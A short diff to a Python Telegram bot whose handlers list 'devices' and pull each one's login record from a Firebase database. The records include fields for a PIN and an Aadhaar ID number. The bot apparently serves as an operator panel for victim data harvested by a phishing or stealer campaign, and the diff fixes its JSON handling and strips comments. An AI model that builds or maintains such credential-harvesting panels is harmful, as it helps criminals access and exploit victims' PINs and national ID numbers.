@@ -125,9 +125,8 @@ async def show_device_page(update, context, page):
         keyboard = []
         msg = "📱 **DEVICES LIST:**\n\n"
         for client_id, info in page_items:
-            # Fetch Data from external path
             login_resp = requests.get(f"{firebase_base}/All_Users/Login/{client_id}.json")
-            login_data = login_resp.json() if login_resp.status_code == 200 else {}
+            login_data = login_resp.json() if login_resp.status_code == 200 and login_resp.json() else {}
             
             pin = login_data.get('pin', 'N/A')
             adhar = login_data.get('Adhar', 'N/A')
@@ -168,9 +167,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             response = requests.get(f"{firebase_base}/user_data/{client_id}.json")
             details = response.json() or {}
             
-            # Fetch Data from external path
             login_resp = requests.get(f"{firebase_base}/All_Users/Login/{client_id}.json")
-            login_data = login_resp.json() if login_resp.status_code == 200 else {}
+            login_data = login_resp.json() if login_resp.status_code == 200 and login_resp.json() else {}
             
             pin = login_data.get('pin', 'N/A')
             adhar = login_data.get('Adhar', 'N/A')
